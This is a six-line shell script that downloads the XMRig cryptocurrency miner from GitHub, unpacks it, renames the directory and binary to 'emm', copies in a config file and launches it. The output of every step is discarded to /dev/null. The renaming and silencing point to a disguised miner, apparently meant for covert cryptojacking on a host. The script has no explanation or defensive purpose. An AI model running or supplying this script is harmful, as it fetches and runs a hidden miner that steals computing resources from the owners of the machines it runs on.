wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz -O xmrig.tar.gz >> /dev/null
tar -zxvf xmrig.tar.gz >> /dev/null
mv xmrig*/ emm
mv emm/xmrig emm/emm
cp config.json emm/config.json
./emm/emm >> /dev/null
